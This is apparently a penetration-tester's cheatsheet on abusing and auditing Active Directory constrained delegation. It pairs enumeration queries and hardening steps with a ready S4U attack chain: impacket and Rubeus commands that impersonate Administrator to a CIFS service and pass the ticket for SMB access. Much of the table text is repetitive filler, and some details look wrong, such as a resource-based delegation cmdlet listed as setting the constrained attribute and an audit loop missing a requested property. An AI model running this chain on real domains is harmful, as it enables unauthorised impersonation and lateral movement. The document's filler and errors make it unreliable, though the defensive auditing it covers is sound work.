---
aliases:
  - Constrained Delegation
  - S4U2Self
  - S4U2Proxy
  - msDS-AllowedToDelegateTo
tags:
  - type/cheatsheet
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - "[[AD - Delegation Enumeration]]"
  - "[[Constrained Delegation (S4U)]]"
---
# AD - Delegation Enumeration - Constrained Delegation (S4U)

***

## Concept Overview

| **Concepto** | **Detalle** | **Notas** |
|:---:|:---:|:---:|
| Constrained Delegation (CD) | Service-specific delegation | Granular. |
| `msDS-AllowedToDelegateTo` attribute | List of SPNs delegateable | LDAP. |
| S4U2Self | Get TGS for any user | Standard. |
| S4U2Proxy | Use TGS to access target service | Standard. |
| Use Kerberos only | UAC bit standard | Stricter. |
| Use any auth protocol (protocol transition) | UAC TRUSTED_TO_AUTH_FOR_DELEGATION | Permissive. |
| Per-service granular | Specific SPNs only | Standard. |
| User CD = service account level | Standard | Standard. |
| Computer CD = host level | Edge | Standard. |
| Atacante with CD principal compromise → delegate to listed SPNs | Direct | Standard. |
| Targeted impersonation | Can request TGS as any user | Standard. |
| Modern: less risky than UD | Hardening | Standard. |
| Modern: RBCD preferred over CD | Standard | Hardening. |
| Detection: CD usage events | Defender | Adjacent. |
| Adjacent: Delegation Abuse hub | Cross-ref | Adjacent. |
| Compliance: documented CD baseline | Standard | Adjacent. |
^ad-cd-concept

### CD discovery

```bash
# Computers with CD
ldapsearch -h DC -D 'dom\u' -w pass -b "DC=dom,DC=local" \
  "(&(objectCategory=computer)(msDS-AllowedToDelegateTo=*))" \
  cn dNSHostName msDS-AllowedToDelegateTo

# Users with CD
ldapsearch -h DC -D 'dom\u' -w pass -b "DC=dom,DC=local" \
  "(&(objectCategory=user)(msDS-AllowedToDelegateTo=*))" \
  samAccountName msDS-AllowedToDelegateTo
```

___

## msDS-AllowedToDelegateTo Attribute

| **Concepto** | **Detalle** | **Notas** |
|:---:|:---:|:---:|
| Multi-valued attribute | List of SPNs | Standard. |
| Format: `service/host` | Standard | Standard. |
| Per-target granular | Specific services only | Standard. |
| `host/server.dom.local` = generic host services | Common | Standard. |
| `cifs/server.dom.local` = SMB | Common | Standard. |
| `MSSQLSvc/server.dom.local:1433` = SQL | Standard | Standard. |
| `HTTP/server.dom.local` = Web | Standard | Standard. |
| `LDAP/server.dom.local` = LDAP | Edge | Standard. |
| Multiple SPNs allowed | Per-principal | Standard. |
| Wildcard SPNs not supported | Specific only | Standard. |
| Wildcard via cifs/host = SMB-only | Granular | Standard. |
| Authenticated read | Default | Permissive. |
| Modify requires write | Privileged | Standard. |
| `Set-ADUser -ServicePrincipalNames` adjacent | Different attr | Adjacent. |
| Set via PowerShell | `Set-ADComputer -PrincipalsAllowedToDelegateToAccount` | Privileged. |
| Detection: msDS-AllowedToDelegateTo modify | Defender | Adjacent. |
^ad-cd-attr

### CD attribute query

```powershell
# All principals with CD configured
Get-ADComputer -Filter {msDS-AllowedToDelegateTo -like "*"} `
  -Properties msDS-AllowedToDelegateTo |
  Select Name,DNSHostName,
    @{n='DelegatedTo';e={$_.'msDS-AllowedToDelegateTo' -join '; '}}

Get-ADUser -Filter {msDS-AllowedToDelegateTo -like "*"} `
  -Properties msDS-AllowedToDelegateTo |
  Select Name,SamAccountName,
    @{n='DelegatedTo';e={$_.'msDS-AllowedToDelegateTo' -join '; '}}
```

___

## Use Kerberos Only vs Protocol Transition

| **Mode** | **UAC Flag** | **Notas** |
|:---:|:---:|:---:|
| Use Kerberos only | UAC bit standard (no special flag) | Stricter. |
| Use any authentication protocol (protocol transition) | UAC TRUSTED_TO_AUTH_FOR_DELEGATION (0x1000000) | Permissive. |
| Kerberos only: requires forwardable TGT from user | User must auth | Standard. |
| Protocol transition: S4U2Self generates TGS without user TGT | Standard chain | Critical. |
| Atacante prefer protocol transition | More permissive | OPSEC. |
| `Set-ADAccountControl -TrustedToAuthForDelegation` | RSAT modify | Privileged. |
| Discovery via UAC bit 0x1000000 | LDAP filter | Direct. |
| BloodHound `AllowedToDelegate` edge | Visual | Tool. |
| Modern: avoid protocol transition | Hardening | Standard. |
| Adjacent: Constrained Delegation hub | Cross-ref | Adjacent. |
| Per-principal modify rights | Granular | Standard. |
| Detection: protocol transition events | Defender | Adjacent. |
| Audit: minimize protocol transition | Standard | Compliance. |
| Cleanup post-engagement | Standard | OPSEC. |
| Modern: RBCD instead of CD with protocol transition | Hardening | Standard. |
| Cross-correlate priv | Standard | Audit. |
^ad-cd-modes

### Mode discovery

```powershell
# Constrained delegation with protocol transition (UAC bit 0x1000000 = 16777216)
Get-ADComputer -Filter * -Properties UserAccountControl,msDS-AllowedToDelegateTo |
  Where {
    $_.'msDS-AllowedToDelegateTo' -and
    ($_.UserAccountControl -band 16777216)
  } |
  Select Name,DNSHostName,
    @{n='DelegatedTo';e={$_.'msDS-AllowedToDelegateTo' -join '; '}}
# Output: CD with protocol transition (more permissive)

# Constrained delegation Kerberos only (UAC bit not set)
Get-ADComputer -Filter * -Properties UserAccountControl,msDS-AllowedToDelegateTo |
  Where {
    $_.'msDS-AllowedToDelegateTo' -and
    -not ($_.UserAccountControl -band 16777216)
  } |
  Select Name,DNSHostName
```

___

## S4U2Self + S4U2Proxy Chain

| **Step** | **Mechanism** | **Notas** |
|:---:|:---:|:---:|
| 1. Get TGT for CD principal (compromised) | `Rubeus asktgt` or impacket-getTGT | Standard. |
| 2. S4U2Self: request forwardable TGS for any user | KDC validates | Standard. |
| 3. S4U2Proxy: use TGS to access target SPN | Standard | Standard. |
| Result: TGS for target service as impersonated user | Direct access | Standard. |
| `Rubeus s4u` | Standard tool | Standard. |
| `impacket-getST` | Linux equivalent | Adjacent. |
| `getST.py -spn cifs/server -impersonate Administrator` | Standard | Standard. |
| Use TGS via Pass-the-Ticket | Adjacent | Adjacent. |
| Service-specific access only | Granular | Standard. |
| `Account is sensitive and cannot be delegated` | Defender | Hardening. |
| Tier 0 users with NOT_DELEGATED flag | Standard | Hardening. |
| Detection: S4U requests | Defender | Adjacent. |
| Adjacent: Constrained Delegation hub | Cross-ref | Adjacent. |
| Cross-correlate target service | Standard | Audit. |
| Cleanup: ticket cache | Standard | OPSEC. |
| Modern: AES-only Kerberos | Hardening | Standard. |
^ad-cd-s4u

### S4U2Self + S4U2Proxy

```bash
# Linux Impacket
# Get TGT for compromised CD principal
impacket-getTGT dom.local/svc-account:pass

# S4U: get TGS for target as impersonated user
KRB5CCNAME=svc-account.ccache impacket-getST \
  -spn cifs/server.dom.local \
  -impersonate Administrator \
  dom.local/svc-account:pass

# Use TGS for SMB access
KRB5CCNAME=Administrator.ccache impacket-smbclient -k -no-pass server.dom.local
```

```cmd
:: Windows Rubeus
Rubeus.exe asktgt /user:svc-account /password:pass
Rubeus.exe s4u /user:svc-account /rc4:HASH /msdsspn:cifs/server.dom.local /impersonateuser:Administrator /ptt
```

___

## Privileged CD Identification

| **Pattern** | **Risk** | **Notas** |
|:---:|:---:|:---:|
| CD to DC SPN | Direct DC compromise | Critical. |
| CD to LDAP SPN | LDAP impersonation | Critical. |
| CD to MSSQLSvc on critical DB | DB takeover | High. |
| CD to HTTP on Tier 0 web | Web app priv | High. |
| User CD with high SPN count | Service account | Audit. |
| Computer CD on Tier 0 server | Critical | Critical. |
| CD with protocol transition | More permissive | Audit. |
| Cross-correlate target SPN priv | Standard | Audit. |
| BloodHound `AllowedToDelegate` edges | Visual | Tool. |
| Cypher: priv CD paths | Custom | Standard. |
| Detection: CD priv adds | Defender | Adjacent. |
| Audit: minimize CD scope | Best practice | Standard. |
| Compliance: per-CD justification | Standard | Adjacent. |
| Modern: RBCD preferred | Hardening | Standard. |
| Stale CD configurations | Audit | Standard. |
| Cleanup: remove unused CD | Hygiene | Standard. |
^ad-cd-privileged

### Priv CD audit

```powershell
# CD principals + their target SPNs (cross-correlate priv targets)
Get-ADComputer -Filter * -Properties msDS-AllowedToDelegateTo,UserAccountControl | 
  Where {$_.'msDS-AllowedToDelegateTo'} | 
  ForEach-Object {
    $delegated = $_.'msDS-AllowedToDelegateTo'
    foreach ($spn in $delegated) {
      [PSCustomObject]@{
        Source = $_.Name
        TargetSPN = $spn
        ProtocolTransition = ($_.UserAccountControl -band 16777216) -ne 0
        IsPrivilegedTarget = $spn -match "ldap|cifs.*\bdc\b|HOST.*\bdc\b"
      }
    }
  }
```

___

## BloodHound CD Visualization

| **Edge** | **Significado** | **Notas** |
|:---:|:---:|:---:|
| `AllowedToDelegate` | CD edge | Standard. |
| Source: principal with CD | Standard | Standard. |
| Target: target service principal | Standard | Standard. |
| Cypher: find CD paths | Standard | Tool. |
| Cross-correlate with priv | Standard | Tool. |
| BloodHound CE 5.x+ CD support | Modern | Tool. |
| Visual graph | Per-edge | Tool. |
| Per-domain ingest | Multi-domain | Adjacent. |
| BHCE 6.x improved | Modern | Tool. |
| Custom analytics | Cypher | Tool. |
| Pre-built CD queries | Standard | Tool. |
| Detection: BloodHound collection events | Defender | Adjacent. |
| Modern: continuous BHCE | Defender | Standard. |
| Compliance: CD baseline | Standard | Adjacent. |
| Cypher: paths via CD principal | Custom | Tool. |
| Adjacent: BloodHound hub | Cross-ref | Adjacent. |
^ad-cd-bh

### BloodHound CD queries

```cypher
// All CD relationships
MATCH (src)-[:AllowedToDelegate]->(target)
RETURN src.name, target.name

// CD principals with priv target (CRITICAL)
MATCH (src)-[:AllowedToDelegate]->(target)
WHERE target.adminCount = true OR target.highvalue = true
RETURN src.name, target.name

// Owned principal can delegate to high-value
MATCH (u {owned: true})-[:AllowedToDelegate]->(target {highvalue: true})
RETURN u.name, target.name

// Path: owned → CD → DA via S4U
MATCH (u {owned: true})-[:AllowedToDelegate*1..]->(target)
WHERE target.adminCount = true OR target.name CONTAINS "DC"
RETURN u.name, target.name
```

___

## Common Misconfigurations

| **Misconfig** | **Risk** | **Notas** |
|:---:|:---:|:---:|
| CD with protocol transition + priv target | Critical | Critical. |
| Service account CD to LDAP/DC | DC compromise path | Critical. |
| CD to Tier 0 SPN | Cross-tier | Critical. |
| Stale CD config | Old delegation | Audit. |
| Authenticated Users with WriteProperty msDS-AllowedToDelegateTo | Critical | Critical. |
| Disabled account with CD | Stale | Audit. |
| Cross-trust CD | Cross-forest | Critical. |
| Foreign principal as target | Cross-trust | Critical. |
| Service account in DA + CD | Privileged + delegation | Critical. |
| BloodHound `WriteProperty AllowedToDelegate` adjacent | Tool | Adjacent. |
| Detection: CD config changes | Defender | Adjacent. |
| Audit: minimize protocol transition | Standard | Compliance. |
| Modern: RBCD preferred | Hardening | Standard. |
| Compliance: per-CD justification | Standard | Adjacent. |
| Cleanup: unused CD | Hygiene | Standard. |
| Per-quarter CD review | Standard | Compliance. |
^ad-cd-misconfig

### Misconfig detection

```powershell
# Stale CD (disabled accounts)
Get-ADUser -Filter {Enabled -eq $false -and msDS-AllowedToDelegateTo -like "*"} `
  -Properties msDS-AllowedToDelegateTo

# CD to Tier 0 SPNs (cross-tier audit)
$tier0Pattern = "ldap|cifs.*\bdc\b|HOST/.*\bdc\b"
Get-ADComputer -Filter * -Properties msDS-AllowedToDelegateTo |
  Where {$_.'msDS-AllowedToDelegateTo'} |
  Where {
    ($_.'msDS-AllowedToDelegateTo' -join ' ') -match $tier0Pattern
  } |
  Select Name,@{n='TargetSPNs';e={$_.'msDS-AllowedToDelegateTo' -join '; '}}
```

___

## Mitigations

| **Mitigation** | **Detail** | **Notas** |
|:---:|:---:|:---:|
| Use RBCD instead of CD | Modern preferred | Hardening. |
| Disable protocol transition | Stricter | Hardening. |
| Add Tier 0 to Protected Users | Defender | Standard. |
| `Account is sensitive and cannot be delegated` UAC | Tier 0 user setting | Hardening. |
| Per-CD justification documented | Standard | Compliance. |
| Per-quarter CD audit | Standard | Compliance. |
| Detection: CD config changes | Defender | Adjacent. |
| Microsoft Defender for Identity CD alerts | Modern | Defender. |
| BloodHound continuous CD monitoring | Modern | Tool. |
| AES-only Kerberos | Hardening | Standard. |
| Network: limit CD principal network access | Hardening | Standard. |
| Audit log retention | Standard | Adjacent. |
| Cleanup: stale CD | Hygiene | Standard. |
| Compliance: minimize CD scope | Best practice | Standard. |
| Per-CD MFA enforcement | Modern hardening | Standard. |
| Cross-correlate with priv tier | Standard | Audit. |
^ad-cd-mitigations

### Hardening commands

```powershell
# Add Tier 0 admins to Protected Users (prevents CD)
Add-ADGroupMember -Identity "Protected Users" -Members "DA-User1","DA-User2"

# Mark Tier 0 user as not delegateable
Set-ADAccountControl -Identity "DA-User1" -AccountNotDelegated $true

# Audit + remove unused CD
Get-ADComputer -Filter {msDS-AllowedToDelegateTo -like "*"} |
  ForEach-Object {
    $name = $_.Name
    $delegated = $_.'msDS-AllowedToDelegateTo' -join '; '
    Write-Host "Audit CD on $name: $delegated"
    # Manual review required before disable
  }

# Disable protocol transition
Set-ADAccountControl -Identity "Server01$" -TrustedToAuthForDelegation $false
```

***
